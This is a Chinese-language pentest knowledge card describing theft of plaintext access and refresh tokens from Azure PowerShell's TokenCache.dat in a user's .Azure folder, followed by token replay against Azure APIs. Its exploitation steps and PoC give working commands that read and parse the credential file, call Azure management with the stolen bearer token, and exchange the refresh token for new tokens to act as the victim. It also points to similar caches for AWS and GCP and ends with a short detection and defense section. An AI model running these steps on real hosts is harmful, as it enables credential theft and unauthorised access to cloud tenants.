---
id: cloud-cloud-iam-azure-powershell-tokencache-plaintext-token
title: Azure PowerShell TokenCache.dat 明文令牌窃取：从用户 .Azure 目录读取 AccessToken/RefreshToken 复用云端资源
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: azure-powershell-tokencache-plaintext-token-theft
aliases:
- TokenCache.dat 凭据
- AzureRM 令牌缓存
- .Azure 目录令牌
- AccessToken RefreshToken 窃取
- Azure PowerShell 凭据缓存
- ADAL token cache
tags:
- azure
- entra-id
- cloud-iam
- token-theft
- credential-discovery
- azure-powershell
- adal
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V655
  verified_at: '2026-11-13T05:27:11+08:00'
  notes: 已对照原文与40张图核对：C:\Users\mhope\.Azure\ 下 TokenCache.dat（7896B）及 AzureRmContext.json/AzureRmContextSettings.json/AzurePSDataCollectionProfile.json；TokenCache.dat 为明文 JSON，键 login.windows.net/<tenant>/:::https://graph.windows.net(及 management.core.windows.net):::1950a258-227b-4e31-a9cf-717495945fc2:::0，值含 RefreshToken/AccessToken(JWT)/AccessTokenType Bearer/ExpiresOn/IdToken/TenantId/UserInfo，图18/20 一致；ACL 为 NT AUTHORITY\SYSTEM、BUILTIN\Administrators、MEGABANK\mhope FullControl，图19 一致。修正：PoC jq 原引用不存在的 .Resource 字段，改为按 key 提取（resource 编码在 key 中）。未验证点：原文仅读取缓存文件，未演示 token replay/refresh；frontmatter 无 sources/source_url。
---

## 一句话结论

在已控制的主机上，Azure PowerShell（AzureRM）用户目录 `%USERPROFILE%\.Azure\TokenCache.dat` 是 ADAL 令牌缓存的明文 JSON，包含当前会话对 `graph.windows.net`、`management.core.windows.net` 等资源的 AccessToken、RefreshToken、ExpiresOn 与 client_id；读取后可在有效期内直接以 Bearer 调用对应 API，或用 RefreshToken 向 Entra ID 换取新令牌，从而以受害者身份访问 Azure/Office 365 资源，无需知道其密码。

## 原理

- **令牌缓存位置**：AzureRM PowerShell 把登录上下文与令牌缓存持久化在用户目录 `.Azure` 下：`AzureRmContext.json` 记录 tenant/account/默认订阅与云环境端点，`TokenCache.dat` 是序列化的 ADAL `TokenCache`，`AzureRmContextSettings.json`、`AzurePSDataCollectionProfile.json` 保存设置。
- **为什么是明文**：该文件是 JSON 结构，键形如 `login.windows.net/<tenant>/:::https://graph.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0`，值为包含 `RefreshToken`、`AccessToken`（JWT）、`AccessTokenType: Bearer`、`ExpiresOn`、`IdToken`、`TenantId`、`UserInfo` 的 JSON；文件权限通常只到当前用户/管理员（本例 `NT AUTHORITY\SYSTEM`、`BUILTIN\Administrators`、用户本人 FullControl），任何拿到该用户上下文或管理员权限的人都可读取。
- **令牌语义**：AccessToken 是 bearer 凭证，直接放进 `Authorization: Bearer` 即可调用其 audience 对应的 API；RefreshToken 可在有效期内向 `https://login.microsoftonline.com/<tenant>/oauth2/token` 以 `grant_type=refresh_token`、原 `client_id`、`resource` 换取新的 AccessToken（旧版 AzureRM 的 client id 如 `1950a258-227b-4e31-a9cf-717495945fc2`）。
- **权限边界**：令牌只代表该用户在该资源上的权限与 `scp` 范围（示例 management token 的 `scp` 为 `user_impersonation`），并不自动等于全局管理员；但结合目录角色枚举/横向，常能进一步扩大。
- **为什么可复用**：云访问普遍使用 bearer token，拿到缓存文件等于拿到“无密码会话”；Azure CLI 的 `accessTokens.json`、MSAL 缓存（`msal.cache`）等同类文件也是相同思路，只是格式不同。

## 触发条件

- 已获得主机上的用户上下文或文件读取权限（本地管理员、WinRM/RDP shell、共享/备份泄露、恶意软件收集）。
- 该用户近期使用过 Azure PowerShell/Azure CLI 登录 Azure，缓存文件存在且包含未过期 AccessToken 或有效 RefreshToken。
- 网络可达 Entra ID 登录端点（刷新令牌）与目标资源 API；租户未对旧版 client id 做限制（Conditional Access 可能拦截）。

## 利用步骤

1. **定位缓存**：枚举 `%USERPROFILE%\.Azure\`，关注 `TokenCache.dat`、`AzureRmContext.json`；Azure CLI 场景看 `%USERPROFILE%\.azure\accessTokens.json`、`msal.cache`。
2. **读取与解析**：直接读取 `TokenCache.dat`（JSON 文本），或先 `Get-Acl` 确认可读；用 `jq`/正则提取 `AccessToken`、`RefreshToken`、`ExpiresOn`、`resource`、`client_id`、`tenant`。
3. **直接使用**：对未过期 AccessToken，按其 audience 调用 API，例如 `https://management.core.windows.net`（经典管理面）或 `https://graph.windows.net`（AAD Graph）；请求头 `Authorization: Bearer <token>`。
4. **刷新令牌**：AccessToken 过期时，用 RefreshToken 换取新令牌：
   `POST https://login.microsoftonline.com/<tenant>/oauth2/token`
   `grant_type=refresh_token&client_id=<client_id>&refresh_token=<refresh_token>&resource=<resource>`
5. **枚举与利用**：用管理面令牌列订阅/资源（`GET https://management.azure.com/subscriptions?api-version=2020-01-01` 等，需对应 resource 令牌），或读目录信息；按返回权限做横向/数据访问。
6. **留证**：记录文件路径、令牌 audience/exp、获取时间与来源主机，避免在日志中明文打印完整令牌。

## PoC

```bash
# 1) 定位并读取缓存
ls -la "$USERPROFILE/.Azure/" 2>/dev/null || ls -la ~/.Azure/
cat "$USERPROFILE/.Azure/TokenCache.dat"

# 2) 提取令牌与元数据（文件为 JSON 时；resource/tenant/client_id 编码在 key 中）
jq -r 'to_entries[] | [.key, .value.AccessToken, .value.RefreshToken, (.value.ExpiresOn | tostring), .value.TenantId] | @tsv' \
  "$USERPROFILE/.Azure/TokenCache.dat"

# 3) 直接使用未过期 AccessToken
curl -s -H "Authorization: Bearer <AccessToken>" \
  "https://management.core.windows.net/subscriptions"

# 4) 用 RefreshToken 换新 AccessToken（旧版 AzureRM client id 示例）
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/token" \
  -d "grant_type=refresh_token" \
  -d "client_id=1950a258-227b-4e31-a9cf-717495945fc2" \
  -d "refresh_token=<RefreshToken>" \
  -d "resource=https://management.core.windows.net/"
```

文件内容示例（字段形式）：

```json
{
  "login.windows.net/<tenant>/:::https://graph.windows.net/:::1950a258-...:::0": {
    "RefreshToken": "AQABAAAA...",
    "AccessToken": "eyJ0eXAiOiJKV1Qi...",
    "AccessTokenType": "Bearer",
    "ExpiresOn": "...",
    "TenantId": "<tenant>",
    "UserInfo": {"DisplayableId": "user@tenant.onmicrosoft.com"}
  }
}
```

## 变体与关联

- **Azure CLI**：`~/.azure/accessTokens.json` 直接是 access token 数组；新版 MSAL 缓存为 `msal.cache`（可能带平台加密），思路相同。
- **其它云**：AWS CLI `~/.aws/credentials`/SSO cache、GCP `application_default_credentials.json` 的 refresh token；同样是“主机上的云凭据缓存”。
- **与浏览器会话结合**：Entra ID 会话 cookie 重放可绕过密码/MFA 进入门户，TokenCache 则面向 API/资源，两者互补。
- 关联卡片：[[cloud-cloud-iam-entra-id-session-cookie-replay]]（会话 cookie 重放）、[[pentest-ad-azure-ad-connect-adsync-credential-decrypt]]（同主机 ADSync 凭据解密）、[[pentest-ad-entra-connect-pta-logonuser-hook-credential-backdoor]]（PTA 明文凭据窃取）。

## 检测与防御

- **资产与权限**：把存放云令牌缓存的用户目录视为高敏凭据，限制本地管理员与文件读取；跳板机/共享主机登录后清理 `.Azure`/`.azure` 目录，避免令牌长期驻留。
- **令牌治理**：缩短 AccessToken/RefreshToken 生命周期，启用 Conditional Access（设备合规、位置、风险），对旧版 AzureRM client id 与异常刷新行为告警；发现泄露后撤销 refresh token 与会话（`revokeSignInSessions`）。
- **检测**：监控对 `TokenCache.dat`/`accessTokens.json` 的异常读取（EDR 文件访问、进程命令行含 `.Azure`）、非交互式 bearer 调用（CloudTrail/Azure 活动日志中无对应登录的 API 调用）、来自陌生 IP/设备的令牌使用。
- **架构**：生产负载优先使用托管标识/工作负载身份而非用户凭据；把云管理操作收敛到受控跳板并启用 PIM/短时令牌。
